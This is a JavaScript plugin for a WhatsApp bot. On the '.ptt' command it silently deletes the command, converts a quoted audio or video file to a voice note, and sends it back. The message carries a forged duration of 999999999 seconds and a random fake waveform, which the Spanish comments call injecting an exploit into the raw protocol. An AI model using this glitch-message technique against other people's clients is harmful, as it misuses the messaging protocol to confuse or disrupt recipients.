import fs from 'fs';
import { exec } from 'child_process';
import util from 'util';
import path from 'path';

const execPromise = util.promisify(exec);

export default {
    name: 'audio_infinito',
    match: (text, { quoted, getMediaInfo }) => /^\.ptt$/i.test(text) && quoted && ['audio', 'video'].includes(getMediaInfo(quoted)?.type),
    execute: async ({ sock, remitente, msg, quoted, getMediaInfo, downloadContentFromMessage }) => {
        
        const mediaInfo = getMediaInfo(quoted);
        if (!mediaInfo) return;

        // Borramos el comando en modo sigilo
        try { await sock.sendMessage(remitente, { delete: msg.key }); } catch (e) {}

        const idStr = Date.now().toString();
        const tmpDir = path.resolve('./tmp');
        if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir);

        const inputPath = path.join(tmpDir, `in_${idStr}.${mediaInfo.ext}`);
        const outputPath = path.join(tmpDir, `out_${idStr}.ogg`);

        try {
            const stream = await downloadContentFromMessage(mediaInfo.msg, mediaInfo.type);
            let buffer = Buffer.from([]);
            for await(const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
            fs.writeFileSync(inputPath, buffer);

            const ffmpegPath = path.resolve('./ffmpeg');
            // Forzamos el formato estricto de notas de voz de WhatsApp (OGG Opus)
            await execPromise(`"${ffmpegPath}" -i "${inputPath}" -c:a libopus -b:a 48K -vbr on -compression_level 10 -frame_duration 20 -application voip "${outputPath}" -y`);

            const audioBuffer = fs.readFileSync(outputPath);

            // Generamos una onda de frecuencia visualmente falsa y caótica
            const fakeWaveform = new Uint8Array(64);
            for(let i=0; i<64; i++) {
                fakeWaveform[i] = Math.floor(Math.random() * 256);
            }

            // Inyectamos el exploit en el protocolo crudo
            await sock.sendMessage(remitente, {
                audio: audioBuffer,
                mimetype: 'audio/ogg; codecs=opus',
                ptt: true, // Fuerza a que sea Nota de Voz (micrófono verde)
                seconds: 999999999, // Duración absurda
                waveform: fakeWaveform 
            }, { quoted: quoted });

        } catch (err) {
            console.error("Error PTT Glitch:", err);
            await sock.sendMessage(remitente, { text: `❌ Fallo de compilación: ${err.message}` });
        } finally {
            [inputPath, outputPath].forEach(file => {
                if (fs.existsSync(file)) try { fs.unlinkSync(file); } catch(e) {}
            });
        }
    }
};
